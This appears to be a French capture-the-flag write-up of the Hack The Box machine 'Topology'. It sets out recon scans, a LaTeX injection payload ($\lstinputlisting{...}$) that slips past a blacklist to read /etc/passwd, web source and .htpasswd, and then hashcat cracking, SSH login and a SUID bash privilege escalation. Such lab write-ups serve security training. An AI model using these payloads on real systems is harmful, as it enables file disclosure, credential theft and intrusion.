  # Topology

	echo "10.10.11.217 topology.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.217 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 10.10.11.217 -oN nmap.txt
	feroxbuster --silent -u http://topology.htb

Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)  
	80/tcp open http Apache httpd 2.4.41

=> http://topology.htb/javascript
</br>=> http://topology.htb/portraits
</br>=> http://topology.htb/images

Rien de rien dans les sous-dossiers.

</br>Scans complémentaires pour le web : 

	gobuster dns -d topology.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
	ffuf -u http://topology.htb/FUZZ -w ~/wordlists/dirb_big.txt -e .pdf,.php,.txt,.ini,.conf,.log,.html,.js,.bak,.zip -fc 403
	dirb http://topology.htb/
	nikto -h http://topology.htb/
	
=> dev.topology.htb
</br>=> latex.topology.htb

</br>Sur la page d'accueil il y a un lien vers http://latex.topology.htb/equation.php qui semble être un outil de conversion de formules LaTeX en images.

	echo "10.10.11.217 dev.topology.htb" >> /etc/hosts
	echo "10.10.11.217 latex.topology.htb" >> /etc/hosts
	
Arrivé sur la page, je vois un champ nous permettant de rentrer des opérations en LaTeX. J'ai directement cherché des payloads pour les essayer : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection

En essayant de simples payloads comme "\input{/etc/passwd}" j'ai été renvoyé sur une URL de type http://latex.topology.htb/equation.php?eqn=%5Cinput%7B%2Fetc%2Fpasswd%7D&submit= indiquant "Illegal command detected. Sorry." 

En revanche le payload **"\lstinputlisting{/etc/passwd}"** passe mais amène sur une page blanche. Peut-être qu'il s'agit juste d'une simple liste noire de fonctions et que celle-ci n'est pas dedans.
</br>J'ai vu dans les documentations que l'on pouvait, et devait, enrober les expressions entre des "$"  pour passer en mode mathématique et interpréter les expressions. 

Et le payload **"\$\lstinputlisting{/etc/passwd}\$"** a fonctionné, j'ai bien eu une image avec le contenu du fichier : http://latex.topology.htb/equation.php?eqn=%24%5Clstinputlisting%7B%2Fetc%2Fpasswd%7D%24&submit=

Le seul utilisateur avec un shell de connexion est "vdaisley".
</br>Le principal problème est que ce traducteur ne prend que des expressions d'une ligne.
</br>Suite de l'exploitation : 

	$\lstinputlisting{/home/vdaisley/.ssh/id_rsa}$    # RIEN
	$\lstinputlisting{/home/vdaisley/.ssh/id_dsa}$    # RIEN
	$\lstinputlisting{/home/vdaisley/.ssh/id_ecdsa}$  # RIEN
	$\lstinputlisting{/etc/shadow}$                   # RIEN
	$\lstinputlisting{/var/www/index.html}$           # RIEN
	$\lstinputlisting{/var/www/latex/index.html}$     # RIEN
	$\lstinputlisting{/var/www/latex/equation.php}$   # OK
	$\lstinputlisting{/var/www/dev/index.html}$       # OK
	$\lstinputlisting{/var/www/dev/.htpasswd}$        # OK

Rien d'intéressant dans le code source PHP à part la confimartion que le filtre n'est qu'une petite liste noire incomplète. 

En revanche le fichier **.htpasswd** nous donne un identifiant et un mot de passe, qui au-delà de servir pour entrer sur la page http://dev.topology.htb pourrait aussi marcher en SSH : 

	hashcat -a 0 -m 1600 '$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO' ~/wordlists/rockyou.txt
	...
	ssh vdaisley@10.10.11.217
	cat user.txt

### Élévation de privilèges : 

	find / -perm /4000 2>/dev/null
	/bin/bash -p
	cat /root/root.txt
	
